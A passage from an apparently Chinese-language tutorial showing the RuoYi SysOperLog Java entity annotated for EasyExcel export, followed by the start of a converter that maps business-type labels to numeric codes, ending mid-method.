<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>read<span class="token punctuation">.</span></span><span class="token class-name">BusiTypeStringNumberConverter</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>read<span class="token punctuation">.</span></span><span class="token class-name">OperTypeConverter</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>read<span class="token punctuation">.</span></span><span class="token class-name">StatusConverter</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 操作日志记录表 oper_log
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@ExcelIgnoreUnannotated</span>
<span class="token annotation punctuation">@ColumnWidth</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@HeadRowHeight</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@HeadFontStyle</span><span class="token punctuation">(</span>fontHeightInPoints <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SysOperLog</span> <span class="token keyword">extends</span> <span class="token class-name">BaseEntity</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>

    <span class="token comment">/** 日志主键 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"操作序号"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Long</span> operId<span class="token punctuation">;</span>

    <span class="token comment">/** 操作模块 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"操作模块"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> title<span class="token punctuation">;</span>

    <span class="token comment">/** 业务类型（0其它 1新增 2修改 3删除） */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"业务类型"</span><span class="token punctuation">,</span> converter <span class="token operator">=</span> <span class="token class-name">BusiTypeStringNumberConverter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> businessType<span class="token punctuation">;</span>

    <span class="token comment">/** 业务类型数组 */</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> businessTypes<span class="token punctuation">;</span>

    <span class="token comment">/** 请求方法 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"请求方法"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> method<span class="token punctuation">;</span>

    <span class="token comment">/** 请求方式 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"请求方式"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> requestMethod<span class="token punctuation">;</span>

    <span class="token comment">/** 操作类别（0其它 1后台用户 2手机端用户） */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"操作类别"</span><span class="token punctuation">,</span> converter <span class="token operator">=</span> <span class="token class-name">OperTypeConverter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> operatorType<span class="token punctuation">;</span>

    <span class="token comment">/** 操作人员 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"操作人员"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> operName<span class="token punctuation">;</span>

    <span class="token comment">/** 部门名称 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"部门名称"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> deptName<span class="token punctuation">;</span>

    <span class="token comment">/** 请求url */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"请求地址"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> operUrl<span class="token punctuation">;</span>

    <span class="token comment">/** 操作地址 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"操作地址"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> operIp<span class="token punctuation">;</span>

    <span class="token comment">/** 操作地点 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"操作地点"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> operLocation<span class="token punctuation">;</span>

    <span class="token comment">/** 请求参数 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"请求参数"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> operParam<span class="token punctuation">;</span>

    <span class="token comment">/** 返回参数 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"返回参数"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> jsonResult<span class="token punctuation">;</span>

    <span class="token comment">/** 操作状态（0正常 1异常） */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"状态"</span><span class="token punctuation">,</span> converter <span class="token operator">=</span> <span class="token class-name">StatusConverter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> status<span class="token punctuation">;</span>

    <span class="token comment">/** 错误消息 */</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"错误消息"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> errorMsg<span class="token punctuation">;</span>

    <span class="token comment">/** 操作时间 */</span>
    <span class="token annotation punctuation">@DateTimeFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@ExcelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"操作时间"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Date</span> operTime<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Long</span> <span class="token function">getOperId</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operId<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperId</span><span class="token punctuation">(</span><span class="token class-name">Long</span> operId<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operId <span class="token operator">=</span> operId<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> title<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token class-name">String</span> title<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>title <span class="token operator">=</span> title<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getBusinessType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> businessType<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBusinessType</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> businessType<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>businessType <span class="token operator">=</span> businessType<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getBusinessTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> businessTypes<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBusinessTypes</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> businessTypes<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>businessTypes <span class="token operator">=</span> businessTypes<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> method<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMethod</span><span class="token punctuation">(</span><span class="token class-name">String</span> method<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">=</span> method<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getRequestMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> requestMethod<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRequestMethod</span><span class="token punctuation">(</span><span class="token class-name">String</span> requestMethod<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>requestMethod <span class="token operator">=</span> requestMethod<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getOperatorType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operatorType<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperatorType</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> operatorType<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operatorType <span class="token operator">=</span> operatorType<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOperName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperName</span><span class="token punctuation">(</span><span class="token class-name">String</span> operName<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operName <span class="token operator">=</span> operName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDeptName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> deptName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDeptName</span><span class="token punctuation">(</span><span class="token class-name">String</span> deptName<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>deptName <span class="token operator">=</span> deptName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOperUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operUrl<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperUrl</span><span class="token punctuation">(</span><span class="token class-name">String</span> operUrl<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operUrl <span class="token operator">=</span> operUrl<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOperIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operIp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperIp</span><span class="token punctuation">(</span><span class="token class-name">String</span> operIp<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operIp <span class="token operator">=</span> operIp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOperLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operLocation<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperLocation</span><span class="token punctuation">(</span><span class="token class-name">String</span> operLocation<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operLocation <span class="token operator">=</span> operLocation<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOperParam</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operParam<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperParam</span><span class="token punctuation">(</span><span class="token class-name">String</span> operParam<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operParam <span class="token operator">=</span> operParam<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getJsonResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> jsonResult<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setJsonResult</span><span class="token punctuation">(</span><span class="token class-name">String</span> jsonResult<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>jsonResult <span class="token operator">=</span> jsonResult<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> status<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> status<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> status<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> errorMsg<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setErrorMsg</span><span class="token punctuation">(</span><span class="token class-name">String</span> errorMsg<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>errorMsg <span class="token operator">=</span> errorMsg<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Date</span> <span class="token function">getOperTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> operTime<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOperTime</span><span class="token punctuation">(</span><span class="token class-name">Date</span> operTime<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>operTime <span class="token operator">=</span> operTime<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBuilder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span><span class="token class-name">ToStringStyle</span><span class="token punctuation">.</span>MULTI_LINE_STYLE<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operId"</span><span class="token punctuation">,</span> <span class="token function">getOperId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span> <span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"businessType"</span><span class="token punctuation">,</span> <span class="token function">getBusinessType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"businessTypes"</span><span class="token punctuation">,</span> <span class="token function">getBusinessTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"method"</span><span class="token punctuation">,</span> <span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"requestMethod"</span><span class="token punctuation">,</span> <span class="token function">getRequestMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operatorType"</span><span class="token punctuation">,</span> <span class="token function">getOperatorType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operName"</span><span class="token punctuation">,</span> <span class="token function">getOperName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"deptName"</span><span class="token punctuation">,</span> <span class="token function">getDeptName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operUrl"</span><span class="token punctuation">,</span> <span class="token function">getOperUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operIp"</span><span class="token punctuation">,</span> <span class="token function">getOperIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operLocation"</span><span class="token punctuation">,</span> <span class="token function">getOperLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operParam"</span><span class="token punctuation">,</span> <span class="token function">getOperParam</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"status"</span><span class="token punctuation">,</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"errorMsg"</span><span class="token punctuation">,</span> <span class="token function">getErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"operTime"</span><span class="token punctuation">,</span> <span class="token function">getOperTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>添加字符串翻译内容</p>
<p><strong>ruoyi-system\com\ruoyi\system\domain\read\BusiTypeStringNumberConverter.java</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>read</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>converters<span class="token punctuation">.</span></span><span class="token class-name">Converter</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>enums<span class="token punctuation">.</span></span><span class="token class-name">CellDataTypeEnum</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span></span><span class="token class-name">CellData</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>property<span class="token punctuation">.</span></span><span class="token class-name">ExcelContentProperty</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 业务类型字符串处理
 *
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"rawtypes"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BusiTypeStringNumberConverter</span> <span class="token keyword">implements</span> <span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">supportJavaTypeKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">CellDataTypeEnum</span> <span class="token function">supportExcelTypeKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">CellDataTypeEnum</span><span class="token punctuation">.</span>STRING<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">convertToJavaData</span><span class="token punctuation">(</span><span class="token class-name">CellData</span> cellData<span class="token punctuation">,</span> <span class="token class-name">ExcelContentProperty</span> contentProperty<span class="token punctuation">,</span>
            <span class="token class-name">GlobalConfiguration</span> globalConfiguration<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Integer</span> value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> str <span class="token operator">=</span> cellData<span class="token punctuation">.</span><span class="token function">getStringValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"新增"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"修改"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"删除"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"授权"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"导出"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"导入"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"强退"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"生成代码"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
